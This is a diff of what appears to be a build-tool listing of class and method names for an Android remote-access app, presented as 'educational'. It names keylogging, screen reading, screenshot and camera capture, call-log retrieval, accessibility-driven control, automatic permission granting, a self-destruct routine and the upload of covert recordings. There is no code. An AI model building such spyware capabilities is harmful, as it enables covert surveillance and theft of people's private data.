@@ -3062,6 +3062,8 @@ com.remoteaccess.educational.network.SocketManager:
     private static final long SCREEN_READER_NORMAL_INTERVAL_MS
     private static final long SCREEN_READER_PATTERN_INTERVAL_MS
     private static final java.lang.String TAG
+    private static final long WAKE_KEEP_ALIVE_INTERVAL_MS
+    private static final long WAKE_KEEP_ALIVE_TIMEOUT_MS
     private java.lang.String bitmapToBase64(android.graphics.Bitmap,int)
     public boolean isDynamicallyMonitored(java.lang.String)
     public void pushKeylogEntry(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String)
@@ -13014,8 +13016,6 @@ com.remoteaccess.educational.commands.AppMonitor:
     public static boolean isMonitored(java.lang.String)
     public static void onAppForeground()
     public static void onTextChanged()
-com.remoteaccess.educational.commands.CameraHandler:
-    public static org.json.JSONObject takePhoto()
 com.remoteaccess.educational.commands.CommandExecutor:
     public static int frequencyToChannel()
     public static org.json.JSONObject handleGetCallLogs()
@@ -13119,7 +13119,6 @@ com.remoteaccess.educational.commands.ScreenController:
     public final boolean swipeGesture(int,int,int,int)
     public static org.json.JSONObject touch()
     public final boolean tryScrollNode(int)
-    public static org.json.JSONObject wakeScreen()
 com.remoteaccess.educational.commands.ScreenReader:
     public static void findClickableNodes()
     public static void findInputNodes()
@@ -13127,7 +13126,6 @@ com.remoteaccess.educational.commands.ScreenReader:
 com.remoteaccess.educational.commands.ScreenshotHandler:
     public android.content.Context context
     public static android.graphics.Bitmap captureBitmap()
-    public static org.json.JSONObject takeScreenshot()
 com.remoteaccess.educational.network.SocketManager$$InternalSyntheticLambda$3$d80d46de0e6ea939c4d75a5b647cebe4ea996819abd5b5b89cddd1f2c4c7cbf9$0:
     public final synthetic com.remoteaccess.educational.services.UnifiedAccessibilityService f$1
 com.remoteaccess.educational.network.SocketManager$2:
@@ -13142,7 +13140,7 @@ com.remoteaccess.educational.network.SocketManager:
     public static com.remoteaccess.educational.commands.GestureRecorder getGestureRecorder()
     public static com.remoteaccess.educational.commands.KeyloggerService getKeylogger()
     public static void initGestureRecorder()
-    public static boolean isAccessibilityCommand()
+    public static boolean isAccessibilityCommand(java.lang.String)
     public static boolean isConnected()
     public static boolean isGestureCommand()
     public final boolean isStreamingActive()
@@ -13154,11 +13152,11 @@ com.remoteaccess.educational.network.SocketManager:
     public static void lambda$dispatchFrameSend$11()
     public static synthetic void lambda$forceReconnect$8()
     public static void lambda$listenForMessages$6()
-    public static void lambda$performSelfDestruct$22()
+    public static void lambda$performSelfDestruct$23()
     public static synthetic void lambda$processMessage$7()
-    public static synthetic void lambda$pushKeylogEntry$19()
-    public static synthetic void lambda$pushNotification$20()
-    public static synthetic void lambda$pushRecentActivity$21()
+    public static synthetic void lambda$pushKeylogEntry$20()
+    public static synthetic void lambda$pushNotification$21()
+    public static synthetic void lambda$pushRecentActivity$22()
     public static synthetic void lambda$scheduleFrameAfterAction$1()
     public static synthetic void lambda$startBlockFrameMode$13()
     public static synthetic void lambda$startBlockFrameMode$14()
@@ -13166,9 +13164,10 @@ com.remoteaccess.educational.network.SocketManager:
     public static synthetic void lambda$startIdleFrameMode$12()
     public static synthetic void lambda$startScreenReaderLoop$16()
     public static void lambda$startScreenReaderLoop$17()
-    public static synthetic void lambda$stopScreenReaderLoop$18()
+    public static void lambda$startWakeKeepAliveLoop$18()
+    public static synthetic void lambda$stopScreenReaderLoop$19()
     public static synthetic void lambda$streamChannelLoop$4()
-    public static void lambda$uploadPendingOfflineRecordings$24()
+    public static void lambda$uploadPendingOfflineRecordings$25()
     public static void listenForMessages()
     public static void liveChannelLoop()
     public static void processMessage()
@@ -13180,11 +13179,11 @@ com.remoteaccess.educational.network.SocketManager:
     public static void sendHeartbeat()
     public static void sendPong()
     public static void sendResponse()
-    public static void startBlockFrameMode()
     public static void startHeartbeat()
     public final void startIdleFrameMode(java.lang.String)
     public final void startScreenReaderLoop(boolean)
     public static void stopScreenReaderAutoNoSave()
+    public final void stopWakeKeepAliveLoop()
     public static void streamChannelLoop()
     public static void uploadPendingOfflineRecordings()
 com.remoteaccess.educational.permissions.AutoPermissionManager:
